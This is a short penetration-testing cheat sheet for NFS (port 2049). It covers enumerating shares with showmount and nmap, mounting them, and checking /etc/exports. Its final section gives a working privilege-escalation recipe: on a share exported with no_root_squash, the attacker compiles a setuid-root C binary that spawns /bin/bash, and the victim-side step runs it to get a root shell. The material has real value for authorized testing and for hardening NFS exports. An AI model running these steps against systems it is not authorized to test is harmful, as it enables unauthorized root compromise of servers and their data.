# NFS - 2049

#### Show Mountable NFS Shares <a href="#show-mountable-nfs-shares" id="show-mountable-nfs-shares"></a>

```
showmount -e <IP>
nmap --script=nfs-showmount -oN mountable_shares <IP>
```

#### Mount a share <a href="#mount-a-share" id="mount-a-share"></a>

```
sudo mount -v -t nfs <IP>:<SHARE> <DIRECTORY>
sudo mount -v -t nfs -o vers=2 <IP>:<SHARE> <DIRECTORY>
```

#### NFS misconfigurations <a href="#nfs-misconfigurations" id="nfs-misconfigurations"></a>

```
# List exported shares
cat /etc/exports
```

If you find some directory that is configured as no\_root\_squash/no\_all\_squash you may be able to privesc.

```
# Attacker, as root user

mkdir <DIRECTORY>
mount -v -t nfs <IP>:<SHARE> <DIRECTORY>
cd <DIRECTORY>
echo 'int main(void){setreuid(0,0); system("/bin/bash"); return 0;}' > pwn.c
gcc pwn.c -o pwn
chmod +s pwn

# Victim

cd <SHARE>
./pwn # Root shell
```
